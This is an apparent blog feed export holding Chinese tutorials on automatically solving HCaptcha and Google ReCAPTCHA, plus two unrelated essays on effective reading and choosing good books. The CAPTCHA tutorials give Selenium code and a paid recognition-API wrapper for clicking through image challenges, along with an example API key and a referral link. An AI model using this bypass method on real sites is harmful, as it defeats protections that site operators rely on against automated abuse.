title="校验结果"></a>校验结果</h3><p>点击完了之后，我们可以尝试检查网页变化，看看有没有验证成功。</p><p>比如验证成功的标志就是出现一个绿色小对勾：</p><p><img src="https://qiniu.cuiqingcai.com/7xm28.png" alt=""></p><p>检查方法如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_is_successful</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.switch_to_captcha_entry_iframe()</span><br><span class="line">    anchor: WebElement = self.wait.until(EC.visibility_of_element_located((</span><br><span class="line">        By.CSS_SELECTOR, <span class="string">'#anchor #checkbox'</span></span><br><span class="line">    )))</span><br><span class="line">    checked = anchor.get_attribute(<span class="string">'aria-checked'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'checked <span class="subst">&#123;checked&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">return</span> str(checked) == <span class="string">'true'</span></span><br></pre>      </td>    </tr>  </table></figure><p>这里我们先切换了 iframe，然后检查了对应的 class 是否是符合期望的。</p><p>最后如果 get_is_successful 返回结果是 True，那就代表识别成功了，那就整个完成了。</p><p>如果返回结果是 False，我们可以进一步递归调用上述逻辑进行二次识别，直到识别成功即可。</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment"># check if succeed</span></span><br><span class="line">is_succeed = self.get_is_successful()</span><br><span class="line"><span class="keyword">if</span> is_succeed:</span><br><span class="line">    logger.debug(<span class="string">'verifed successfully'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    self.verify_captcha()</span><br></pre>      </td>    </tr>  </table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>以上代码可能比较复杂，这里我将代码进行了规整，然后放到 GitHub 上了，大家如有需要可以自取：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvSENhcHRjaGFSZXNvbHZlcg==">https://github.com/Python3WebSpider/HCaptchaResolver<i class="fa fa-external-link-alt"></i></span></p><h2 id="注册地址"><a href="#注册地址" class="headerlink" title="注册地址"></a>注册地址</h2><p>最后需要说明一点，上面的验证码服务是收费的，每验证一次可能花一定的点数，比如识别一次 3x3 的图要花 10 点数，而充值一块钱就能获得 1000 点数，所以识别一次就一分钱，还是比较便宜的。</p><p>我这里充值了好几万点数，然后我就变成了 VIP5 级的账号。我研究了下发现大家如果用我的邀请链接 <span class="exturl" data-url="aHR0cHM6Ly95ZXNjYXB0Y2hhLmNvbS9pL0NuWlBCdQ==">https://yescaptcha.com/i/CnZPBu<i class="fa fa-external-link-alt"></i></span> 注册大家可以直接变成 VIP4，然后 VIP4 可以获取首充赠送 10% 的优惠，还不错哈～</p><p>希望本文对大家有帮助。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前面的文章我们介绍过 ReCaptcha 的模拟点击破解教程，但除了 ReCaptcha，还有另外和 ReCapacha 验证流程很相似的验证码，叫做 HCaptcha。&lt;/p&gt;
&lt;p&gt;ReCaptcha 是谷歌家的，因为某些原因，咱们国内是无法使用 ReCaptcha 的
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="验证码" scheme="https://cuiqingcai.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
      <category term="验证码识别" scheme="https://cuiqingcai.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>怎样才是有效阅读</title>
    <link href="https://cuiqingcai.com/36059.html"/>
    <id>https://cuiqingcai.com/36059.html</id>
    <published>2022-05-29T04:03:12.000Z</published>
    <updated>2022-08-01T15:41:26.008Z</updated>
    
    <content type="html"><![CDATA[<p>你有没有过这样的经历：现在自媒体、短视频兴起的时代，我们有时候听到好像两种完全的对立的观点，但我们有时候可能觉得这也对，那也对，但我们就没能力去反驳和佐证某个观点。听风就是雨，觉得自己没有能力去分辨哪些是对的，哪些是错的。我们的大脑好像就像别人观点的跑马场，听到这个观点，脑子中过一遍，好像觉得又道理，又来了一个相反的观点，脑子中过一遍，好像也有道理。但很明显，二者肯定只有一个是对的，那为什么我们就没有能力分辨呢？</p><p>这是因为，我们脑中的知识储备还不够，对一个问题的思考还不够深刻。</p><p>读书是我们摄入知识的一个重要来源，就拿看书来说吧。</p><p>我们人总一种倾向性，那就是在读书的时候倾向于去寻找和自己意见观点相似的内容，从一些书中去寻找认同感。</p><p>借用《暗时间》里面的一段话：</p><blockquote>  <p>我们在阅读的时候会无意识地过滤掉不符合我们既有知识和心智结构的知识，以我们情感所中意的方向对事实和观点进行“再解释”，对不符合我们立场、预期和情感诉求的观点弃之如敝履，对合我们立场、预期和情感诉求的观点则不细究其论证过程。</p></blockquote><p>所以，很多时候，我们看似在看一本书，但多数情况下我们只是从大致层面上理解了我们倾向去接受的一些观点，而去忽略一些和我们想法相悖的观点。</p><p>结果是什么？只是道理穿肠过，执念心头坐。已有的概念和道理还是存在于我们的脑海里，没有的概念和道理也不会进入到我们的脑海里，其实这种阅读方式就是一种缺乏深度的阅读，这只不过是一些符号记忆，一种模糊认知，是很有问题的。</p><p>那说到这，有人可能就问，那什么才是有效的阅读呢？</p><p>有效的阅读是要用心去读的，带着思维去到一篇文本之中，去理解为什么作者就提出了这样的观点，这样的观点是怎样一步步论证出来的，论证过程中所用的依据的可信度高不高等等。其实这个过程有点像读论文了，我们读论文的时候一般就会按照上面的过程来分析，如果我们把这个模式应用到读书上，效果也会是很好的。</p><p>在阅读的过程中我们同时还要进行一些反面的思考，比如结论的对立面有没有道理，有没有可能通过类似的方式也能佐证结论的对立面。经过反向思考，我们可以强化整个思考的过程，对已有的正确结论的论证有更清晰的认知。因为一个问题的论证，它也有反证法的对不对？</p><p>这种阅读才是一种深度、有效的阅读。</p><p>但这里需要强调的是，这里说的深度阅读并不是让我们花费很多时间对一篇文章一句话一句话的扣，这里强调的深度阅读是要在阅读的过程中多去思考，去尝试理解其精髓和思维脉络，去辩证地看待一些观点。有时候有些书看起来很冗长的，举了非常多的例子都为了佐证一个观点，但实际上核心的点可能就那么几段话或甚至几句话，我们能够找出其中的关键思维脉络才是最关键的，而不是说要把每个例子也逐句扣完。</p><p>再借用《暗时间》里面的一段话：</p><blockquote>  <p>在这样的阅读中，一篇文本能够帮助我们纠正我们的知识体系中有问题的结论或预设，可能会为我们已经确立的结论提供更深刻的佐证，可能会帮助我们弥补知识体系中的短板，进一步反思我们的知识体系中那些含糊、广而泛之的结论，也可能会彻底纠正我们之前错误的想法，也可能帮我们打开了一个新的知识分支。</p></blockquote><p>如此的阅读，我们头脑中对的认知才能更加强化，同时也可以对我们错误的认知加以纠正，长此以往，我们的思维会在碰撞中不断成长。</p><p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;你有没有过这样的经历：现在自媒体、短视频兴起的时代，我们有时候听到好像两种完全的对立的观点，但我们有时候可能觉得这也对，那也对，但我们就没能力去反驳和佐证某个观点。听风就是雨，觉得自己没有能力去分辨哪些是对的，哪些是错的。我们的大脑好像就像别人观点的跑马场，听到这个观点，脑
      
    
    </summary>
    
    
      <category term="个人记录" scheme="https://cuiqingcai.com/categories/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="阅读" scheme="https://cuiqingcai.com/tags/%E9%98%85%E8%AF%BB/"/>
    
      <category term="阅读技巧" scheme="https://cuiqingcai.com/tags/%E9%98%85%E8%AF%BB%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>看书也要挑剔点</title>
    <link href="https://cuiqingcai.com/36058.html"/>
    <id>https://cuiqingcai.com/36058.html</id>
    <published>2022-05-28T15:00:22.000Z</published>
    <updated>2022-08-01T15:41:26.012Z</updated>
    
    <content type="html"><![CDATA[<p>我想多数人应该会对很多事情有所挑剔吧，比如买一件衣服的时候挑挑选选、货比三家最后才定下一件衣服，比如点餐的时候也挑挑选选找出想吃的一家。但有时候大家在看书的时候可能就没有那么“挑剔”，可能心想，这是本书，然后我花时间看书了，好像就可以了，就以为自己学会了，自己用功了，自己进步了，实际上，很多时候可能只是在自己骗自己，寻找一些心里安慰罢了，只是为了临时缓解自己的一些焦虑感罢了，但实际上真正有没有进步，有没有学到东西，要看自己是否真正去用心学了，当然另一方面也取决于书本身的质量好不好。</p><p>所以，上面提到了看一本书的关键两个点：</p><ul>  <li>一个是是否用心去看、去思考了。</li>  <li>一个是书本身的质量如何。</li></ul><p>今天，我们专门来说说第二点。</p><p>选一本好书，其实对我们的时间负责。</p><p>我们每个人的时间都是宝贵的，有时候我们随意地找本书烂书来看，说实话还不如不看。去花时间选一本好书，做好选书的功课是非常重要的。有时候决定读一本书之前，稍微花一点点时间去网上看看评价，综合分析一下，就能比较快地知道这本书到底值不值得看。因为有时候读一本书的时候我们可能花很多时间去深入阅读，在深入阅读之前，迅速了解一本书的质量可以帮我们节省很多的时间，甚至说看到某本书质量完全不行，那直接摒弃不看，那就省去了看这本书的时间，对不对？</p><p>个人建议，多读那些经典好书。</p><p>那么问题来了，怎么知道一本书是好书呢？依我个人而言，主要有这么几个点：</p><ul>  <li>看评价。我们说群众的眼睛是雪亮的，一千个读者会有一千个哈姆雷特。所以，每个人看完书之后都可能会有不同视角的评价。个人建议去豆瓣、亚马逊上先去看看评价是怎样的，比如评分过低两三分的那种直接 pass 就行了。另外除了看评分，也去看看一些文字评价，特别要注意去看看那些低分评价是怎么说的，多数情况下，一些小众的低分评价可能更多来自于一些懂行的人，而一些大众的高分评价很可能是浮于表面的评价或者甚至是刷的。所以，如果我们从一些低分评价里面都找不出来一些实质的反驳观点，那基本上这本书应该是不错的了。</li>  <li>看目录和简介。通常情况下，一本书的目录和简介都是公开的。通过目录我们能够快速地了解到这本书讲了什么内容，是不是符合我们的期望，有没有我们真正想学的内容。通过简介我们可以大致了解这本书的写作初衷，解决了什么痛点，传达给我们什么信息，另外我们还能通过简介大致了解到作者的思维脉络。基本上一本书要有一个清晰有层次的目录和简介，这本书就差不到哪里去。</li>  <li>看作者。这个其实分两种情况了，一种情况是我们知道这个作者，另一种情况是我们不知道这个作者。对于前者，如果他是一个知名作家、教授或者曾经写过一些优秀的作品，那么他的某本书应该差不了。对于后者，我们可以去查阅他的相关简介、履历，尝试了解一些他的其他作品，了解下他人对作者的评价，如果不错的话，那么该作者的作品应该大概率会不错的。</li>  <li>看样章。一些书的网站上通常都会有一些试读章节，我们可以选一些章节来阅读下。比如条理是否清晰、内容是否深刻，其实读上个几页或者两三节我们就知道了。如果样章的内容都让我们感到不知所云，那么整本书应该就不值得读了。</li></ul><p>好，那知道了好书的一些评判标准，那从哪里找到一些好书呢？</p><ul>  <li>排行榜：这其实和看电影是类似的了，比如一些豆瓣上的优秀书单，一些高分评价的书，通常都差不了。</li>  <li>朋友推荐：一般来说，一个人能跟我们成为朋友，那他的思维和三观应该不会和我们差太多。那如果朋友觉得还不错的话，我们应该也多数情况下不会觉得很差的。另外，朋友一般在推荐书的时候，可能真的会挑自己印象最深刻的或者近期读到的最值得说的书告诉我们，所以这个信息其实是朋友又帮我们经过了一些筛选得到的，所以多数情况下，一些朋友推荐的书质量应该还都不错。</li>  <li>引用：一本好的书籍或作品，往往在其他多数作品、文章、论文里面会被引用，这个信息我们也值得注意下。比如我最近读了刘未鹏的《暗时间》，他的书里面推荐了几本关于思维的书籍《这才是心理学》、《你的灯亮着吗》、《合作的进化》等书，应该都差不了。</li>  <li>同一作者的著作：我们觉得某本书写得还不错，那么该作者的其他书籍应该也在多数情况下会不错。就像一个歌手出了一首不错的歌，那么其他的一些歌的质量应该也差不了。一样的道理。</li></ul><p>好了，今天就唠到这里，总结下，这篇文章主要讲了：</p><ul>  <li>多读那些经典好书，选一本好书，其实对我们的时间负责。</li>  <li>怎样知道一本书是一本好书。</li>  <li>怎样去寻找一本好书。</li></ul><p>希望对大家有所启发～</p><p>本文部分论点来源：《暗时间》</p><p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我想多数人应该会对很多事情有所挑剔吧，比如买一件衣服的时候挑挑选选、货比三家最后才定下一件衣服，比如点餐的时候也挑挑选选找出想吃的一家。但有时候大家在看书的时候可能就没有那么“挑剔”，可能心想，这是本书，然后我花时间看书了，好像就可以了，就以为自己学会了，自己用功了，自己进
      
    
    </summary>
    
    
      <category term="个人记录" scheme="https://cuiqingcai.com/categories/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="看书" scheme="https://cuiqingcai.com/tags/%E7%9C%8B%E4%B9%A6/"/>
    
      <category term="读书习惯" scheme="https://cuiqingcai.com/tags/%E8%AF%BB%E4%B9%A6%E4%B9%A0%E6%83%AF/"/>
    
  </entry>
  
  <entry>
    <title>谷歌验证码 ReCAPTCHA 的模拟点击破解方案来了！</title>
    <link href="https://cuiqingcai.com/36057.html"/>
    <id>https://cuiqingcai.com/36057.html</id>
    <published>2022-05-26T10:00:22.000Z</published>
    <updated>2022-08-01T15:41:25.976Z</updated>
    
    <content type="html"><![CDATA[<p>大家好，我是崔庆才。</p><p>之前的时候我分享过 ReCAPTCHA 的破解方案，那种方案是获取到 ReCAPTCHA 其中的一个 siteKey，然后将 siteKey 直接提交给 ReCAPTCHA 相关的破解服务来实现破解。</p><p>这次，我们再来介绍一种更灵活更强大的全模拟点击破解方案，整体思路就是将全部的验证码图片进行识别，并根据识别结果对 ReCAPTCHA 验证码进行模拟点击，从而最终通过验证码。</p><h2 id="ReCAPTCHA-介绍"><a href="#ReCAPTCHA-介绍" class="headerlink" title="ReCAPTCHA 介绍"></a>ReCAPTCHA 介绍</h2><p>在开始之前，我这里先简单提下什么是 ReCAPTCHA，可能大家见的不多，因为这个验证码在国内并没有那么普及。</p><p>验证码是类似这样子的：</p><p><img src="https://qiniu.cuiqingcai.com/wvzml.png" alt=""></p><p>我们这时候需要点击验证码上的小框来触发验证，通常情况下，验证码会呈现如下的点选图：</p><p><img src="https://qiniu.cuiqingcai.com/d67uq.png" alt=""></p><p>比如上面这张图，验证码页面会出现九张图片，同时最上方出现文字「树木」，我们需要点选下方九张图中出现「树木」的图片，点选完成之后，可能还会出现几张新的图片，我们需要再次完成点选，最后点击「验证」按钮即可完成验证。</p><p>ReCAPTCHA 也有体验地址，大家可以打开 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9yZWNhcHRjaGEvYXBpMi9kZW1v">https://www.google.com/recaptcha/api2/demo<i class="fa fa-external-link-alt"></i></span> 查看，打开之后，我们可以发现有如上图所示的内容，然后点选图片进行识别即可。</p><h2 id="整体识别思路"><a href="#整体识别思路" class="headerlink" title="整体识别思路"></a>整体识别思路</h2><p>其实我们看，这种验证码其实主要就是一些格子的点选，我们只要把一些相应的位置点击对了，最后就能验证通过了。</p><p>经过观察我们发现，其实主要是 3x3 和 4x4 方格的验证码，比如 3x3 的就是这样的：</p><p><img src="https://qiniu.cuiqingcai.com/525yr.png" alt=""></p><p>4x4 的就是这样的：</p><p><img src="https://qiniu.cuiqingcai.com/0by4l.png" alt=""></p><p>然后验证码上面还有一行加粗的文字，这就是我们要点选的目标。</p><p>所以，关键点就来了：</p><ul>  <li>    <p>第一就是把上面的文字内容找出来，以便于我们知道要点击的内容是什么。</p>  </li>  <li>    <p>第二就是我们要知道哪些目标图片和上面的文字是匹配的，找到了依次模拟点击就好了。</p>  </li></ul><p>听起来似乎很简单的对吧，但第二点是一个难点，我们咋知道哪些图片和文字匹配的呢？这就难搞了。</p><p>其实，这个靠深度学习是能做到的，但要搞出这么一个模型是很不容易的，我们需要大量的数据来训练，需要收集很多验证码图片和标注结果，这总的工作量是非常大的。</p><p>那怎么办呢？这里给大家介绍一个服务网站 YesCaptcha，这个服务网站已经给我们做好了识别服务，我们只需要把验证码的大图提交上去，然后同时告诉服务需要识别的内容是什么，这个服务就可以返回对应识别结果了。</p><p>下面我们来借助 YesCaptcha 来试试识别过程。</p><h2 id="YesCaptcha"><a href="#YesCaptcha" class="headerlink" title="YesCaptcha"></a>YesCaptcha</h2><p>在使用之前我们需要先注册下这个网站，网站地址是 <span class="exturl" data-url="aHR0cHM6Ly95ZXNjYXB0Y2hhLmNvbS9pL0NuWlBCdS8=">https://yescaptcha.com/i/CnZPBu<i class="fa fa-external-link-alt"></i></span>，注册个账号之后大家可以在后台获取一个账户密钥，也就是 ClientKey，保存备用。</p><p><img src="https://qiniu.cuiqingcai.com/a61km.png" alt=""></p><p>OK，然后我们可以查看下这里的官方文档：<span class="exturl" data-url="aHR0cHM6Ly95ZXNjYXB0Y2hhLmF0bGFzc2lhbi5uZXQvd2lraS9zcGFjZXMvWUVTQ0FQVENIQS9wYWdlcy8xODA1NTE2OS9SZUNhcHRjaGFWMkNsYXNzaWZpY2F0aW9uK3JlQ2FwdGNoYStWMg==">https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/18055169/ReCaptchaV2Classification+reCaptcha+V2<i class="fa fa-external-link-alt"></i></span>，这里介绍介绍了一个 API，大致内容是这样的。</p><p>首先有一个创建任务的 API，API 地址为 <span class="exturl" data-url="aHR0cHM6Ly9hcGkueWVzY2FwdGNoYS5jb20vY3JlYXRlVGFzaw==">https://api.yescaptcha.com/createTask<i class="fa fa-external-link-alt"></i></span>，然后看下请求参数：</p><p><img src="https://qiniu.cuiqingcai.com/458el.png" alt=""></p><p>这里我们需要传入这么几个参数：</p><ul>  <li>    <p>type：内容就是 ReCaptchaV2Classification</p>  </li>  <li>    <p>image：是验证码对应的 Base64 编码</p>  </li>  <li>    <p>question：对应的问题 ID，也就是识别目标的代号。</p>  </li></ul><p>比如这里我们可以 POST 这样的一个内容给服务器，结构如下：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"clientKey"</span>: <span class="string">"cc9c18d3e263515c2c072b36a7125eecc078618f"</span>,</span><br><span class="line">    <span class="attr">"task"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"ReCaptchaV2Classification"</span>,</span><br><span class="line">        <span class="attr">"image"</span>: <span class="string">"/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDc...."</span>,</span><br><span class="line">        <span class="attr">"question"</span>: <span class="string">"/m/0k4j"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>其中这里 image 就可以是一个 3x3 或者 4x4 的验证码截图对应的 Base64 编码的字符串。</p><p>然后服务器就会返回类似这样的响应：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"errorId"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"errorCode"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"errorDescription"</span>: <span class="string">"null"</span>,</span><br><span class="line">    <span class="attr">"status"</span>: <span class="string">"ready"</span>,</span><br><span class="line">    <span class="attr">"taskId"</span>: <span class="string">"3a9e8cb8-3871-11ec-9794-94e6f7355a0b"</span>,</span><br><span class="line">    <span class="attr">"solution"</span>: &#123;</span><br><span class="line">        <span class="attr">"objects"</span>: [<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>], <span class="comment">// 图像需要点击的位置</span></span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"multi"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>OK，我们可以看到，返回结果的 solution 字段中的 objects 字段就包含了一些代号，比如这里是 <code>1, 5, 8</code>，什么意思呢？这个就是对应的目标点击代号。</p><p>对于 3x3 的图片来说，对应的代号就是这样的：</p><p><img src="https://qiniu.cuiqingcai.com/7ysym.png" alt=""></p><p>对于 4x4 的图片来说，对应的代号就是这样的：</p><p><img src="https://qiniu.cuiqingcai.com/b2eth.png" alt=""></p><p>OK，知道了代号之后，模拟点击就好办多了吧，我们用一些模拟点击操作就可以完成了。</p><h2 id="代码基础实现"><a href="#代码基础实现" class="headerlink" title="代码基础实现"></a>代码基础实现</h2><p>行，那有了基本思路之后，那我们就开始用 Python 实现下整个流程吧，这里我们就拿 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9yZWNhcHRjaGEvYXBpMi9kZW1v">https://www.google.com/recaptcha/api2/demo<i class="fa fa-external-link-alt"></i></span> 这个网站作为样例来讲解下整个识别和模拟点击过程。</p><h3 id="识别封装"><a href="#识别封装" class="headerlink" title="识别封装"></a>识别封装</h3><p>首先我们对上面的任务 API 实现一下封装，来先写一个类：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> app.settings <span class="keyword">import</span> CAPTCHA_RESOLVER_API_KEY, CAPTCHA_RESOLVER_API_URL</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CaptchaResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, api_url=CAPTCHA_RESOLVER_API_URL, api_key=CAPTCHA_RESOLVER_API_KEY)</span>:</span></span><br><span class="line">        self.api_url = api_url</span><br><span class="line">        self.api_key = api_key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_task</span><span class="params">(self, image_base64_string, question_id)</span>:</span></span><br><span class="line">        logger.debug(<span class="string">f'start to recognize image for question <span class="subst">&#123;question_id&#125;</span>'</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"clientKey"</span>: self.api_key,</span><br><span class="line">            <span class="string">"task"</span>: &#123;</span><br><span class="line">                <span class="string">"type"</span>: <span class="string">"ReCaptchaV2Classification"</span>,</span><br><span class="line">                <span class="string">"image"</span>: image_base64_string,</span><br><span class="line">                <span class="string">"question"</span>: question_id</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(self.api_url, json=data)</span><br><span class="line">            result = response.json()</span><br><span class="line">            logger.debug(<span class="string">f'captcha recogize result <span class="subst">&#123;result&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException:</span><br><span class="line">            logger.exception(</span><br><span class="line">                <span class="string">'error occurred while recognizing captcha'</span>, exc_info=<span class="literal">True</span>)</span><br></pre>      </td>    </tr>  </table></figure><p>OK，这里我们就先定义了一个类 CaptchaResolver，然后主要接收两个参数，一个就是 <code>api_url</code>，这个对应的就是 <span class="exturl" data-url="aHR0cHM6Ly9hcGkueWVzY2FwdGNoYS5jb20vY3JlYXRlVGFzaw==">https://api.yescaptcha.com/createTask<i class="fa fa-external-link-alt"></i></span> 这个 API 地址，然后还有一个参数是 <code>api_key</code>，这个就是前文介绍的那个 ClientKey。</p><p>接着我们定义了一个 create_task 方法，接收两个参数，第一个参数 <code>image_base64_string</code> 就是验证码图片对应的 Base64 编码，第二个参数 <code>question_id</code> 就是要识别的目标是什么，这里就是将整个请求用 requests 模拟实现了，最后返回对应的 JSON 内容的响应结果就好了。</p><h3 id="基础框架"><a href="#基础框架" class="headerlink" title="基础框架"></a>基础框架</h3><p>OK，那么接下来我们来用 Selenium 来模拟打开这个实例网站，然后模拟点选来触发验证码，接着识别验证码就好了。</p><p>首先写一个大致框架：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.remote.webelement <span class="keyword">import</span> WebElement</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> app.captcha_resolver <span class="keyword">import</span> CaptchaResolver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.browser = webdriver.Chrome()</span><br><span class="line">        self.browser.get(url)</span><br><span class="line">        self.wait = WebDriverWait(self.browser, <span class="number">10</span>)</span><br><span class="line">        self.captcha_resolver = CaptchaResolver()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        self.browser.close()</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们先在构造方法里面初始化了一个 Chrome 浏览器操作对象，然后调用对应的 get 方法打开实例网站，接着声明了一个 WebDriverWait 对象和 CaptchaResolver 对象，以分别应对节点查找和验证码识别操作，留作备用。</p><h3 id="iframe-切换支持"><a href="#iframe-切换支持" class="headerlink" title="iframe 切换支持"></a>iframe 切换支持</h3><p>接着，下一步我们就该来模拟点击验证码的入口，来触发验证码了对吧。</p><p>通过观察我们发现这个验证码入口其实是在 iframe 里面加载的，对应的 iframe 是这样的：</p><p><img src="https://qiniu.cuiqingcai.com/xcnxo.png" alt=""></p><p>另外弹出的验证码图片又在另外一个 iframe 里面，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/j5lgg.png" alt=""></p><p>Selenium 查找节点是需要切换到对应的 iframe 里面才行的，不然是没法查到对应的节点，也就没法模拟点击什么的了。</p><p>所以这里我们定义几个工具方法，分别能够支持切换到入口对应的 iframe 和验证码本身对应的 iframe，代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_entry_iframe</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    self.browser.switch_to.default_content()</span><br><span class="line">    captcha_entry_iframe = self.browser.find_element_by_css_selector(</span><br><span class="line">        <span class="string">'iframe[title="reCAPTCHA"]'</span>)</span><br><span class="line">    <span class="keyword">return</span> captcha_entry_iframe</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch_to_captcha_entry_iframe</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    captcha_entry_iframe: WebElement = self.get_captcha_entry_iframe()</span><br><span class="line">    self.browser.switch_to.frame(captcha_entry_iframe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_content_iframe</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    